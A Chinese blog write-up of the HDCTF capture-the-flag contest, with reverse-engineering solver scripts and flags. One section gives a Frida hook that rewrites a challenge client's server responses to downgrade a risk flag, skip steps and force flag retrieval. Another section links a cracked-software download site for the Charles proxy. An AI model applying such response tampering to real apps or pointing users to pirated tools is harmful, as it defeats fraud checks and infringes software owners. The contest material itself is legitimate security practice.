+++
title = 'HDCTF'
date = '2026-09-12T12:00:00+08:00'
draft = false
summary = ''
tags = []
showtoc = true
+++

![2a9991218f21ad58a308e27f114da94c\.png](/images/hdctf/2a9991218f21ad58a308e27f114da94c.png)

## 赛前测试

### welcome

ida中其中的main函数是骗人的 都是加载c/c\+\+逻辑库之类的 不是真正的逻辑

后面发现真正的main入口是藏在CTFmain中的

发现是RC4 但是题目说xxTea（？

发现这个rc4其实是一个摆设

```Python
memcmp(Buf1, "RC4_stage_passed", 0x10u);
puts("Key verification passed.");
```

memcmp的返回值没有被if、while、return或任何变量修改，只是被调用了一下

所以 不管我们输入的是什么 RC4都会让我们通过 输出passed

因此我们重点是放在另一个函数中 sub17D0：

![QQ\_1789052746687\.png](/images/hdctf/QQ_1789052746687.png)

通过这中间的v10是固定常数 锁定出这道应该是一个tea 且是一个xxtea

它是一个魔改版：标准 XXTEA 加密时 `sum += delta`，而这里变成了 `sum -= delta`。所以不能直接用标准 XXTEA 解密，需要把 `sum` 的更新方向反过来。

其他地方没有改动

welcome中：

```C
(((v11 ^ key[...]) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 >> 3)) + ((4 * v12) ^ (v11 >> 5))))
```

标准版：

```C
((z>>5 ^ y<<2) + (y>>3 ^ z<<4)) ^ ((sum ^ y) + (key[...] ^ z))
```

完全等价，只是加法/异或顺序交换。

然后我们就可以应用xxtea的脚本了：

Exp

```Python
import struct

def xxtea_decrypt(data, key):
    n = len(data) // 4
    v = list(struct.unpack('<' + 'I' * n, data))
    k = list(struct.unpack('<' + 'I' * 4, key))
    delta = 0x9E3779B9
    rounds = 6 + 52 // n
    total = (rounds * delta) & 0xFFFFFFFF
    y = v[0]
    for _ in range(rounds):
        e = (total >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            mx = ((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4)) ^ ((total ^ y) + (k[(p & 3) ^ e] ^ z))
            v[p] = (v[p] - mx) & 0xFFFFFFFF
            y = v[p]
        z = v[n - 1]
        mx = ((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4)) ^ ((total ^ y) + (k[0 ^ e] ^ z))
        v[0] = (v[0] - mx) & 0xFFFFFFFF
        y = v[0]
        total = (total - delta) & 0xFFFFFFFF
    return struct.pack('<' + 'I' * n, *v)

cipher_hex = "50DD1F2C696504E6559508D3C8458FAE653D4B60BC25F62B10DF120AF289C039"
key_hex    = "DF9B5713E0AC6824A5A5A5A5F0E1D2C3"

cipher = bytes.fromhex(cipher_hex)
key    = bytes.fromhex(key_hex)

plain = xxtea_decrypt(cipher, key)
print("解密结果（32字节）:", plain)
print("前29字节（flag）:", plain[:29])

#b'HnuCTF{HunSec_is_welcome_2_U}'
```

最终flag改为HDCTF开头 即HDCTF\{HunSec\_is\_welcome\_2\_U\}

## 正式比赛

### RE

#### Neural

flag:HDCTF\{7h3\_w31gh75\_0f\_7ru7h\_4r3\_n07\_4lw4y5\_3qu4l\}

通过提示 我们知道我们的输入：

- 输入 16 个整数，每个必须在 `0 到 95` 之间。

通过字符串锁定到主函数处

![QQ\_1789225683056\.png](/images/hdctf/QQ_1789225683056.png)

##### 分析伪代码

主函数

![QQ\_1789226102183\.png](/images/hdctf/QQ_1789226102183.png)

```Python
EXPECTED_OUT2 = [0x0b, 0x3a, 0xcc, 0xb2, 0xdf, 0xbe, 0x9a, 0x9e, 0x40, 0xb8, 0x13, 0x2f, 0x25, 0x12, 0x17, 0xf6]
EXPECTED_OUT1_IDX = {0:0x4e, 5:0xf5, 10:0x6d, 15:0x5f, 17:0x4b, 22:0xc1, 27:0x9f, 30:0x93}

def main():
    # 1. 接收 16 个数字输入
    user_input = []
    for i in range(16):
        x = input("请输入数字：")
        if x > 95: # 0x5f
            print("invalid input")
            return
        user_input.append(x)
        
    # 2. 第一次调用核心搅拌机 (注意 edx=1)
    out1_first, out2_first = trainer(user_input, edx=1)
    
    # 3. 第二次调用核心搅拌机 (注意 edx=0)
    out1_second, out2_second = trainer(user_input, edx=0)
    
    # 4. 判分！
    # 判分点 A：out2 必须完全对上 16 个字节
    if out2_second != EXPECTED_OUT2:
        print("wrong answer, try again")
        return
        
    # 判分点 B：out1 的 8 个特定位置必须对上
    for idx, val in EXPECTED_OUT1_IDX.items():
        if out1_second[idx] != val:
            print("wrong answer, try again")
            return

    # 5. 如果都过了，说明输入正确！开始解密 Flag
    print("converged")
    A_table = [0x03, 0x0a, 0x01, 0x08, ...] # 48字节
    B_table = [0x2b, 0x6a, 0xd8, 0x52, ...] # 48字节
    flag = ""
    for i in range(48):
        # 用第一次调用的 out2，去查 A 表当索引，取出的值再异或 B 表
        flag += chr(out2_first[A_table[i]] ^ B_table[i])
        
    print("ascii: " + flag)
```

总结：我们要做的，就是找 16 个数字，让它两次经过 `trainer` 搅拌后，算出的 `out1` 和 `out2` 能跟程序里写死的标准答案完全一致。

**核心\-sub16A0 搞混乱的一个函数**

```Python
def trainer(user_input, edx):
    # 【降维打击】：16个数字被分成了 4 组（块），每组 4 个数字。
    # 这4组是各算各的，互不干扰！这是能爆破成功的关键。
    
    # 1. 生成状态表 state1（部分依赖输入）
    state1 = setup_hash(user_input) 
    
    # 2. 生成状态表 state2（完全不依赖输入，是固定的）
    state2 = generate_state2() 
    
    # 3. 准备初始数据（把输入的4个数字加上一张硬编码表 table_350）
    state = initial_state(user_input)
    
    # 4. 跑 54 轮“搅拌”运算
    for round in range(54):
        op = OPS[round]  # 从操作表里取出当前轮要干嘛
        op2 = OP2S[round] # 取出辅助参数
        
        if op == 0x2b or op == 0xe7:
            # 异或运算
            state = xor_with_state1(state, state1, round)
        elif op == 0x51:
            # S盒替换 (查表替换每个字节)
            state = sbox_lookup(state)
        elif op == 0x6d:
            # 置换 (打乱 4 个字节的顺序)
            state = permute(state, op2)
        elif op == 0x87:
            # MixColumns (用自定义的 GF(2^8) 数学公式混合数据)
            state = mix_columns(state, op2)
        elif op == 0xa3:
            # 再次异或 state2
            state = xor_with_state2(state, state2, round)
            
        # 5. 收集输出（WP里说的 r11=0x14 和 0x2a 时抓取）
        if round == 20 or round == 42:
            out1.append(current_state_bytes)
            
    out2 = final_state
    return out1, out2
```

我们一次性输入16个数字 程序在内部将16个数字切成了四份 变成4个数字

程序拿到这4个数字后，而是进行一个54轮的循环。

每一轮，程序会对这4个数字做以下操作之一：

- 跟固定的常量表进行异或（XOR）。

- 拿数字去查一个固定的256字节字典，替换成别的数字。

- 把这4个数字的顺序打乱（置换）。

- 用一套特定的数学公式（GF\(2^8\)乘法）把这4个数字混合在一起算出新值。
经过54轮反复折腾，这4个数字和最初输入的值已经没有任何直观联系了，彻底变成了完全随机的乱码。这么做的目的就是为了增加逆向难度，防止直接倒推出原来的数字。

然后 程序提取出两个成果：

- out1（中间结果）：在第20轮和第42轮时，程序偷偷把当时的乱码拷贝出来，一共32个字节。

- out2（最终结果）：第54轮结束后，最后得到的16个字节。



**out1和out2：**

程序为了校验我们到底有没有猜对这 4 个数字，会在不同时间点“拍照截图”：

- out2（最终截图，16个字节）：
程序在 54 轮结束的那一刻，把这 4 个字节拷走。
因为有 4 组，所以 4 组 × 4 字节 = 16 字节。这就是 `out2`。

- out1（中途截图，32个字节）：
程序在**第 20 轮和第 42 轮的时候**，分别“咔嚓”各拍了一张照，每次拷走 4 个字节。
因为有 4 组，所以 4 组 × 2次抓拍 × 4 字节 = 32 字节。这就是 `out1`。



拿到这两个结果后，程序会去跟硬编码在文件里的“标准答案”作对比：

- `out2` 必须和预设的16个字节一模一样。

- `out1` 里特定位置的8个字节，必须和预设的值一模一样。

##### 脚本思路

```Python
def solve():
    # 对 4 个块分别进行暴力破解
    for block_idx in range(4):
        found = False
        # 穷举这块的 4 个数字 (从0到95)
        for b0 in range(0x60):
            for b1 in range(0x60):
                for b2 in range(0x60):
                    for b3 in range(0x60):
                        test_input_4bytes = [b0, b1, b2, b3]
                        
                    # 模拟程序跑一遍这 4 个数字
                        out1_sim, out2_sim = simulate_trainer_for_block(test_input_4bytes, block_idx)
                        
                   # 检查：out2 对应的 4 个字节 和 out1 的几个点，是不是跟标准答案对上了？
                        if check_constraints(out1_sim, out2_sim):
                            print(f"第 {block_idx} 块找到了！数字是 {test_input_4bytes}")
                            found = True
                            break
        # ... 结束循环
        
    # 拼接 4 块的答案
    final_input = [12, 7, 31, 4, 88, 19, 63, 42, 5, 27, 74, 9, 55, 23, 81, 16]
    print("最终输入：", final_input)
```

##### Exp

```Python
A = bytes.fromhex("030a01080f060d040b020900070e050c" * 3)  # 48 字节
B = bytes.fromhex("2b6ad852218e119c00d90460c02bc000"      # 48 字节
                  "5671ab6038c2548104ee2c67837ff759"
                  "5319c4320b82128d06d940228478c44a")
out2_first = bytes.fromhex("539b8663f4a8f5f106732e3337264c67")

flag = bytearray(48)
for i in range(48):
    flag[i] = out2_first[A[i]] ^ B[i]
print(flag.decode())

*# 输出：HDCTF{7h3_w31gh75_0f_7ru7h_4r3_n07_4lw4y5_3qu4l}*
```

#### 老八餐厅 

flag:HDCTF\{4fc54225\-b980\-e20a\-bcbe\-3bc4d1643887\}

非常有意思的一道题目！

误区：虽然那个指纹看起来很像是很重要的一个点 但实际上是不需要改的

让我们来复盘一下

等我们正常注册姓名学号之后 会出现一个高风险提示 然后会对我们进行二次风险检测 也就是小游戏 想要这些游戏通关是很难的 因此我们可以绕过 但是后面有提示说gui是不重要的 只是走一个流程

所以我们首先把高风险改成低风险 **也就是risk的****`high`****改成****`low`**

接下来 会让我们进行风险评估 也就是进行小游戏 我们可以设置游戏通过

但是有更简单的方法是 我们发现**`next的值`**用户可以修改 直接修改成下下步的问卷也就是questionair 那我们就跳过了这个游戏嘻嘻！

接下来就比较难发现了 一开始以为apple是随便写的 还想换成windows linux 之类的

然后又试了指纹验证

然后又改了do\_you\_want\_get\_flag的值 （这是第三步 我直接阴差阳错跳步了

hook脚本

```JavaScript
// step12.js
const base = (Process.mainModule || Process.enumerateModules()[0]).base;
console.log('[*] Frida ' + Frida.version + '  base=' + base);
globalThis.CFG = { nonce: null };   // null=自动用注册回包里的 next_ticket
globalThis.CAP = {};

globalThis.RS = function (p) {
  try { const n = p.add(0x10).readU64().toNumber(), c = p.add(0x18).readU64().toNumber();
    if (n < 0 || n > 0x8000 || c < n) return null;
    return (c > 15 ? p.readPointer() : p).readUtf8String(n); } catch (e) { return null; } };

globalThis.MALLOC = (function () {
  try { const m = Process.findModuleByName('ucrtbase.dll') || Process.findModuleByName('msvcrt.dll');
    return m ? new NativeFunction(m.findExportByName('malloc'), 'pointer', ['size_t']) : null; } catch (e) { return null; } })();

globalThis.WSX = function (p, s) {
  try { const b = []; for (let i = 0; i < s.length; i++) b.push(s.charCodeAt(i));
    const c = p.add(0x18).readU64().toNumber();
    if (b.length <= c) { const d = c > 15 ? p.readPointer() : p; d.writeByteArray(b); d.add(b.length).writeU8(0); p.add(0x10).writeU64(b.length); return true; }
    if (!MALLOC) { console.log('[!] 没找到 malloc'); return false; }
    const buf = MALLOC(b.length + 1); buf.writeByteArray(b); buf.add(b.length).writeU8(0);
    p.writePointer(buf); p.add(0x10).writeU64(b.length); p.add(0x18).writeU64(b.length);
    console.log('[扩容] -> ' + b.length); return true; } catch (e) { console.log('[!] ' + e); return false; } };

// 1) 记录注册回包里的字段（session_id / server_nonce / next_ticket）
Interceptor.attach(base.add(0x11a30), {
  onEnter(a) { try { this.k = a[2].readUtf8String(); } catch (e) { this.k = null; } },
  onLeave(r) { if (this.k && !(this.k in CAP)) { const v = RS(r); if (v !== null) { CAP[this.k] = v; console.log('[字段] ' + this.k + ' = ' + v); } } }
});

// 2) 改服务器回包
Interceptor.attach(base.add(0xfc20), {
  onLeave(r) {
    const s = RS(r); if (!s) return;
    if (s.indexOf('"risk":"high"') >= 0) {          // 降风险（只替换子串，其余字段保留）
      WSX(r, s.replace('"risk":"high"', '"risk":"low"'));
      console.log('[降风险] ' + RS(r)); return;
    }
    if (s.indexOf('blocked') < 0 && s.indexOf('rejected') < 0) return;
    console.log('\n[回包原文] ' + s);
    const nn = (CFG.nonce !== null) ? CFG.nonce : (CAP.next_ticket || CAP.server_nonce || '');
    if (WSX(r, '{"status":"ok","risk":"low","next":"questionnaire","final_nonce":"' + nn + '"}'))
      console.log('[改回包] ' + RS(r));
  }
});

// 3) 强制索要 flag
Interceptor.attach(base.add(0xdf40), {
  onEnter() { this.context.r8 = ptr(1); console.log('[*] do_you_want_get_flag -> 1'); },
  onLeave(r) { console.log('[最终包] ' + RS(r)); }
});

// 4) 观察
Interceptor.attach(base.add(0x12b50), { onEnter(a) { try { console.log('[HTTP] ' + RS(a[3])); } catch (e) {} } });
Interceptor.attach(base.add(0x64d0), { onEnter(a) { try { console.log('\n[QUIC回包] ' + a[1].readUtf8String()); } catch (e) {} } });
Interceptor.attach(base.add(0xfeb0), { onEnter(a) { for (let i = 3; i <= 4; i++) { const s = RS(a[i]); if (s) console.log('[发送前明文] ' + s); } } });
console.log('\n[*] 就绪');
```

发现还是绕不过 

![b254b1e1cc7cf7c52740e8021ae9ceda\.png](/images/hdctf/b254b1e1cc7cf7c52740e8021ae9ceda.png)

![1236de277439f977332f70f094d5290f\.png](/images/hdctf/1236de277439f977332f70f094d5290f.png)

这里的看广告复活实际上是没用的 这个问卷只是一个摆设而已 没用填对填错的说法

最后发现第二关走错了；第二关走错了，第三关走对也不会给flag

经过提示 发现题目的回包有一个梗 就是用户自己说自己是apple 结果服务器检测到安卓 `android_device_detected`

意思就是用户说自己是苹果 结果被检测出来安卓哈哈哈

因此我们再加一个hook 把`apple`改成`android`

```Plain Text
PLAT = 'android';
FP = null;
CAP = {};
```

最后的问卷随便填写 直接拿到flag

![6c343797968b91650c52befcf76c575c\.png](/images/hdctf/6c343797968b91650c52befcf76c575c.png)

![QQ\_1789219729549\.png](/images/hdctf/QQ_1789219729549.png)

![65320ef0fbb8c25ddaef0aa8c79d6cec\.png](/images/hdctf/65320ef0fbb8c25ddaef0aa8c79d6cec.png)

#### **菲比的破碎解释器**

flag：HDCTF\{feibi\_feibijiubi\_miao\!\}

一开始找不到main函数 通过字符串找到 correct 等等的字符串

![QQ\_1789198374683\.png](/images/hdctf/QQ_1789198374683.png)

![QQ\_1789198428280\.png](/images/hdctf/QQ_1789198428280.png)

看出1440是主函数

通过分析 `.rdata` 段中的字符串和字节数组，定位到关键校验函数 `sub_140001560`。

而真正的逻辑就是在函数1560中

该函数包含两个校验：
第一阶段：

字节码解释器

本质上是一个 基于栈式虚拟机的字节码解释器，**对输入进行 29 轮变换，每轮执行 7 条指令。**

外层循环：

```Java
while ( 2 )   // 无限循环，靠内部的 continue / break 控制
  {
    v7 = 0;       // 内层指令指针，0..6
    v8 = 0;       // 本轮是否执行了保存指令的标志
    LOBYTE(v9) = 0; // v9 的低 8 位清零，v9 是临时变量
    do
    {
      // ... 内层指令执行 ...
    }
    while ( v7++ < 6u );   // 执行 7 次（v7 = 0,1,2,3,4,5,6）

    if ( v8 != 1 || v18[v6] != byte_1400040DA[v6] )
      return 0;            // 本轮失败

    if ( ++v6 != 29 )
      continue;            // 继续下一轮
    break;                 // 29 轮全部完成，跳出外层循环
  }
```

内层循环：字节码解释器

```C++
do
    {
      v11 = byte_1400040B6[v7];   // 取指令表 A 的第 v7 个字节
      if ( v11 <= 0x92 )
      {
        switch ( v11 )
        {
          case '1':   // 0x31
            v5 += 55 * v6 + 165 + (unsigned __int8)v9;
            break;
          case 'F':   // 0x46
            v18[v6] = v9;
            v8 = 1;
            break;
          case '\\':  // 0x5C
            v9 = v5 ^ (v5 >> 8) ^ (unsigned __int8)v9;
            break;
          default:
            return 0;
        }
      }
      else if ( byte_1400040B6[v7] > 0xD7u )   // v11 > 0xD7
      {
        if ( v11 == 216 )   // 0xD8
        {
          v7 = 7;           // 强制结束内层循环
        }
        else
        {
          if ( v11 != 226 ) // 0xE2
            return 0;
          v5 = __ROL4__(v5, 5) ^ (v5 >> 11);
        }
      }
      else if ( v11 == 147 )   // 0x93
      {
        LOBYTE(v9) = BYTE2(v5) + v9;   // 取 v5 的第 3 个字节 + v9 低字节
      }
      else
      {
        if ( v11 != 167 )   // 0xA7
          return 0;
        LOBYTE(v9) = v4[byte_1400040BD[v6]];  // 从输入中按置换表 P 取字节
      }
    }
    while ( v7++ < 6u );
```

共七个字节 对应7层迭代

第二阶段：

对输入的整个字符串进行哈希：

```Plain Text
v15 = 324508639;
for (i = 0; i < len; i++)
    v15 = ROL32(v15 ^ key[i], 7) + 1831565813;
return v15 == 0xEACB9B55;
```

只有哈希值匹配，程序才最终返回 `true`。

- `len`：输入字符串长度（应为 29）。

- `v13`：输入字符串数据指针。

- 哈希算法：32 位循环左移、异或、加法混合。

- 目标哈希值：`0xEACB9B55`。

##### Exp

```Python
def rol32(x, n):
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

# 密文
C = [0xEC,0xE0,0x85,0xA0,0x37,0x41,0xB6,0xC2,0x30,0x9F,
     0xFE,0x1E,0x96,0x5A,0x5E,0x46,0xA9,0x83,0xC5,0x44,
     0x11,0x3A,0x2A,0x9E,0xCB,0x3D,0x98,0x9E,0xDC]

# 置换表
P = [0x11,0x03,0x18,0x08,0x00,0x15,0x0E,0x1B,0x06,0x0C,
     0x01,0x13,0x1A,0x0A,0x04,0x17,0x0F,0x07,0x1C,0x0B,
     0x16,0x05,0x12,0x02,0x19,0x09,0x10,0x0D,0x14]

v5_init = 0xC0DEC0DE
TARGET_HASH = (1 << 32) - 357371307  # 0xEACB9B55

def check_hash(key):
    v15 = 324508639
    for b in key:
        v15 = (rol32(v15 ^ b, 7) + 1831565813) & 0xFFFFFFFF
    return v15 == TARGET_HASH

solutions = []

def dfs(v6, v5, key):
    if v6 == 29:
        if check_hash(key):
            solutions.append(key.copy())
            return True
        return False
    for k in range(256):
        v9 = k
        v5_step2 = (v5 + 55 * v6 + 165 + v9) & 0xFFFFFFFF
        v5_step3 = (rol32(v5_step2, 5) ^ (v5_step2 >> 11)) & 0xFFFFFFFF
        v9_step4 = (v5_step3 ^ (v5_step3 >> 8) ^ v9) & 0xFF
        v9_step5 = (((v5_step3 >> 16) & 0xFF) + v9_step4) & 0xFF
        if v9_step5 == C[v6]:
            key[P[v6]] = k
            if dfs(v6 + 1, v5_step3, key):
                return True
            key[P[v6]] = 0
    return False

key = [0] * 29
if dfs(0, v5_init, key):
    print("找到正确 key:", bytes(key).decode('latin1'))
    print("Key bytes:", key)
else:
    print("未找到满足所有校验的 key")
```

输出flag：HDCTF\{feibi\_feibijiubi\_miao\!\}

##### 分析

###### 为什么用 DFS，而不是简单的两层循环？

如果只用两层循环：

- 外层 `v6` 从 0 到 28。

- 内层枚举 `k` 从 0 到 255，找到第一个满足 `v9_step5 == C[v6]` 的 `k`，然后 `key[P[v6]] = k`，继续下一轮。

但问题是：每一轮可能有多个 `k` 都满足当前密文比较，而不同的 `k` 会改变 `v5` 的值，从而影响后续轮次。如果只取第一个 `k`，可能后面的轮次就无解了。

> 置换表的作用：
> 
> 决定当前轮使用输入字符串中的哪一个字节。它不改变变换算法本身，只是改变了输入字节参与计算的顺序。
> 
> 

###### 置换表在伪代码中的体现

```Plain Text
LOBYTE(v9) = v4[byte_1400040BD[v6]];
```

- `v4`：输入字符串的字符数据指针（前面已经根据 `a4` 解析出来了）。

- `byte_1400040BD`：就是置换表 `P`。

- `v6`：外层轮次计数器，从 0 到 28。

- `byte_1400040BD[v6]`：取出 `P` 中第 `v6` 个元素，这个值是一个 `0~28` 的索引。

- `v4[ ... ]`：用这个索引去访问输入字符串的字节。

- `LOBYTE(v9) = ...`：把取到的字节放到 `v9` 的低 8 位。

所以这一行代码的意思就是：第 `v6` 轮从输入字符串中，取出位置为 `P[v6]` 的那个字节，赋给 `v9`。

#### 潮汐

flag:HDCTF\{Zh3n\_Sh1\_zako\_zako\_\!\!\!\}

这道题考迷宫。

整题的校验逻辑：

```Plain Text
输入 route(33 步) ──> verify()
                        ├─ 迷宫合法性 + 收集 A→B→C + 终点 E
                        ├─ pulse == 9
                        ├─ digest == 0xa285e095
                        └─ RiftGate.calculate(digest, pulse, len, mask) == 0x73a1acb3
                                  │
                                  └──> decrypt(digest, pulse, gate) ──> flag
```

题目本体是一个伪装成「三件事」待办 App（`ThreeThingsApp` / `MainActivity` / Room 数据库）的广告马甲包，真正的校验逻辑藏在 **`SettingsActivity`** 点击进入的隐藏 **Activity ****`TideRelayActivity`**里，类名与 `TideRelayActivity.kt` 同源（`RiftGate.smali` 的 `.source` 也是 `TideRelayActivity.kt`）。

![QQ\_1789202254442\.png](/images/hdctf/QQ_1789202254442.png)

##### 地图

构造函数（`TideRelayActivity.smali` L76\~L98）用 `filled-new-array/range {v0 .. v8}` 填了 9 行字符串，**`filled-new-array`**** 是按寄存器顺序入栈的**，因此 `v7`、`v8` 是第 7、8 行，`v0` 是第 0 行：

```JSON
v0 = "S..#...#."   y=0
v1 = ".##.#..#."   y=1
v2 = ".A..#...."   y=2
v3 = "##.#.###."   y=3
v4 = "~.+#~..B."   y=4
v5 = ".###.#~#."   y=5
v6 = "...#+#..."   y=6
v7 = ".#~C.+.#."   y=7
v8 = "...##..E#"   y=8
```

> 反编译后得到 Smali 代码（Android 虚拟机的汇编语言）。
> 
> 

> `filled-new-array/range {v0 .. v8}`：
> 这是 Dalvik 字节码指令，用于创建一个新数组，并将寄存器 `v0` 到 `v8` 的值依次填入数组。
> 
> 



渲染出来的地图

```Python
x=0 1 2 3 4 5 6 7 8
y=0    S . . # . . . # .
y=1    . # # . # . . # .
y=2    . A . . # . . . .
y=3    # # . # . # # # .
y=4    ~ . + # ~ . . B .
y=5    . # # # . # ~ # .
y=6    . . . # + # . . .
y=7    . # ~ C . + . # .
y=8    . . . # # . . E #
```

##### 移动与状态：

L407\~L619 遍历输入的每个字符：

移动之后：

1. `0 <= x < 9 && 0 <= y < 9`，否则 `"wall at step N"`（撞墙）；

2. `grid[y][x] != '#'`，否则同上；

3. 踩到特殊格子的地形：

这是这道题最核心的机制！

- 踩到 `+`：`pulse -= 1`（扣血或减少某个计数器）。

- 踩到 `~`：`pulse += 2`（回血或增加计数器）。
*\(注：这里提到了 **`pulse`** 变量，说明题目可能有额外判定，比如最终到达终点时 **`pulse`** 必须等于某个值，或者过程中 **`pulse`** 不能小于 0。需要结合其他代码确认。\)*

- 踩到 `A`、`B`、`C`：

    - 必须严格按照 A → B → C 的顺序踩到。

    - 代码逻辑是 `v2` 初始为 `0x41`（就是字符 `'A'`），只有当踩到的字符 `== v2` 时，才会记录掩码 `mask |= 1 << (v2 - 0x41)` 并且 `v2++`（变成 `'B'`）。

    - 如果乱序踩到（比如先踩了 `B`），会被程序忽略（不报错，也不计入进度）。

    - 图片下方甚至贴心地解释了汇编层面 L548 的 `if-ne v4, v2, :cond_6` 是编译器生成的 switch 落点（即如果匹配不成功就跳过，什么都不做）。

- 踩到其他字符：`S`（起点）、`E`（终点）、`.`（平地）没有任何副作用，安全通过。

##### 最后 终点判定

```Java
if (ctr == 0x44)                      // 0x41→0x44 说明 A、B、C 全部按序收集
  if (grid[y][x] == 'E')              // 必须停在终点 E
    if (digest == 0xa285e095)         // 32 位滚动哈希
      if (pulse == 9)
        if (mask == 7)                // 位掩码 0b111，与上一条等价
          ... RiftGate.calculate ...
```

同时入口处（L374\~L380）要求 `route.length() == 0x21 == 33`。

滚动哈希：digest

L572\~L611，每走一步更新一次 `v6`：

```Java
h = rol32(h ^ (route_char + 17 * step) ^ (x << 8) ^ y, 5);
h = (h * 0x45d9f3b + 0x2718281) & 0xffffffff;
```

初始值 `h = 0x13579bdf`。 其中 `x, y` 是**移动之后**的坐标，`step` 从 0 开始。

##### 核心函数 `rift_calculate`（计算校验值）

这是一个用 Python 还原的 Smali 汇编逻辑的函数。它接收四个参数，经过一系列 32 位整数运算，最后返回一个 32 位的哈希值。

- 输入参数（全部由路径决定）：

    - `digest`：可能是一个固定的初始值，或者是路径字符串本身的某种哈希。

    - `pulse`：你在图2中踩到的 `+` 和 `~` 累加起来的值。

    - `length`：你输入的路径字符串的总长度（即走了多少步）。

    - `mask`：你在图2中按顺序踩到 `A`、`B`、`C` 后生成的掩码。

- 运算过程（典型的哈希混淆操作）：

    - `v0 = rol32(...)`：对 `pulse` 乘以一个魔数（`0x9e3779b1`）后循环左移 7 位。

    - 接着是一系列加法、异或（`^`）、乘法。

    - 注意有一个异或常量 `0x54494445`，图的注释标注了它的 ASCII 码是 "TIDE"（潮汐，可能呼应了类名 `TideRelay`）。

    - 最后做了一次 `h ^= (h >> 16)` 的扰动，返回最终结果。

- 最后代入了一组已知的数据：`digest=0xa285e095`, `pulse=9`, `length=33`, `mask=7`。

- 计算结果为 `0x73a1acb3`。

- 完美等于程序内部的 `expectedGate`（预期大门钥匙）。

##### 总结

1. 从 S\(0,0\) 走到 E\(6,8\)

2. 路径长度（length）必须是 33 步

3. 踩到的 `+` 和 `~` 的数量算下来，`pulse` 必须等于 9

4. 必须按顺序踩到 A、B、C，使得 `mask = 7`（二进制 111，说明 A、B、C 都要按顺序踩到）

5. 并且这组数据代入上方函数算出来的结果，必须等于 `0x73a1acb3`

需要写一个 BFS（广度优先搜索）或 DFS 脚本，遍历这 9x9 的地图。在遍历时，不仅要记录坐标，还要把当前走过的步数、pulse、mask 状态一起带入。找到所有符合条件的路径后，将 `U/D/L/R` 路径字符串提交，或者将其作为 Flag 提交。

##### Exp

```Python
encrypted = [0x15,0x0d,0x4c,0x39,0x6d,0x25,0xbc,0xb0,0x4a,0xa1,
             0x05,0xd7,0xed,0xff,0x6a,0xea,0x4c,0x2d,0xba,0x85,
             0xd5,0xb9,0xa9,0xbd,0x59,0xb2,0x5b,0x22,0xb7]

def decrypt(digest, pulse, gate):
    v1 = (digest ^ 0x6d2b79f5) & 0xffffffff    # LCG 状态
    v5 = (pulse  ^ 0xa1b2c3d4) & 0xffffffff    # 累加器
    v7 = (gate   ^ 0x31415926) & 0xffffffff    # 非线性反馈
    out = bytearray()
    for i, e in enumerate(encrypted):
        v1 = (v1 * 0x19660d + 0x3c6ef35f) & 0xffffffff
        v5 = (v5 + rol32(v1, 11) + i) & 0xffffffff
        v7 ^= (v5 >> 7)
        b = ((rol32(v7, 3) ^ (v1 ^ v5)) & 0xff) ^ e ^ ((i * 0x1d + 0x53) & 0xff)
        out.append(b & 0xff)
    return bytes(out)
```

##### 一个小漏洞

ai发现的 题目的一个小小漏洞

在查看`vertify`函数和`decrypt`函数的时候

```Java
move-wide v1, v6：把 digest（固定为 0xa285e095）传给解密函数。
move v3, v8：把 pulse（固定为 9）传给解密函数。
iget-wide v4, ... expectedGate:J：从内存中读取 expectedGate（固定为 0x73a1acb3）传给解密函数。
invoke-direct/range {v0 .. v5}, decrypt(JIJ)：调用解密。
```

我们发现

调用 `decrypt` 时传入的三个参数全部是硬编码常量！

直接在python里面

```Java
decrypt(0xa285e095, 9, 0x73a1acb3)
```

直接跑出flag

#### Mirage★ \-\-

没做出来 遗憾离场。比赛结束再战。

##### 分析

是一道`Android 逆向 + 协议分析 + 服务端交互 + native 签名逆向`的混合题。

流程分析：

1. APK 是客户端；

2. 靶机是服务端；

3. 要逆向 APK，搞清楚它怎么和服务器交互；

4. 然后自己写脚本，伪造/重放一整套“广告竞价 \-\> 失败上报 \-\> 展示 \-\> 兑换奖励”的流程；

5. 最后还要生成一个由 `libmirageproof.so` 签名的 receipt；

6. 靶机验证通过后，才给我们 flag。



题目的zip文件中有很多个分包apk 一开始以为要一个一个分析都懵了 实际上：

这不是“很多个独立的 apk”，这是一个 Split APK（分包 APK）。现在的 Android 应用为了体积小，会把一个 App 拆成多个模块：

- `app-release.apk`：主模块（包含主要的 Java 代码和逻辑）。

- `arm64-release.apk`：包含 native 动态库（提示里说的 `libmirageproof.so` 就在这个包里）。

- `config-release.apk`：配置资源。

- `gamedatalib-release.apk`：这大概率就是提示里说的“二级 dex”！

- `zh-release.apk`：中文语言资源。

> 在 Android 开发中，有一个著名的“64K方法数限制”。早期 Android 的一个 `.dex` 文件（Dalvik Executable）最多只能包含 65536 个方法。当 App 变得庞大（比如引入了各种广告 SDK、支付 SDK）时，代码就会超过这个限制。
> 
> 为了解决这个问题，Google 推出了 Multidex（多 dex） 机制：
> 
> - 主代码放在 `classes.dex`（一级 dex）。
> 
> - 超出的代码会被打包成 `classes2.dex`、`classes3.dex` 等等（这就是二级、三级 dex）。
> 
> `gamedatalib-release.apk`（游戏数据库）大概率就是一个独立的模块，里面包含了一个 `classes.dex`。但相对于主 App（`app-release.apk`）来说，它就是“二级 dex”。
> 提示里说“因子表也在二级 dex”，意思就是：我们要找的广告竞价 tier 因子表、失败衰减公式，不在主 apk 里，而是在 `gamedatalib-release.apk` 这个包的 dex 代码里。 我们反编译这个包才能看到。
> 
> 



顺便在这道题学习过程中安装一个charles抓包工具

https://www\.zzzmode\.com/mytools/charles/ 破解网站

先把这些apk文件拖到安卓模拟里面安装 然后点开

感觉这道题也很有意思！

![QQ\_1789270795163\.png](/images/hdctf/QQ_1789270795163.png)

### MISC

#### Welcome

公众号后台：

```JavaScript
SERDVEZ7VzNsYzBtZV90MF9IRENURl8yMDI2X0x1Y2t5X0QwZyEhIX0=
```

猜base64解码：

![78e904ac2c3354cabcd003e0a248db2f\.png](/images/hdctf/78e904ac2c3354cabcd003e0a248db2f.png)

flag:HDCTF\{W3lc0me\_t0\_HDCTF\_2026\_Lucky\_D0g\!\!\!\}

#### 真的懂word吗

题目描述：

> 这是一篇有关 HnuSec 战队的内部介绍文档，听说有战队成员在里面埋了一个隐藏彩蛋，找到它的人可以直接获得面试加分（假的，但Flag是真的）。
> 
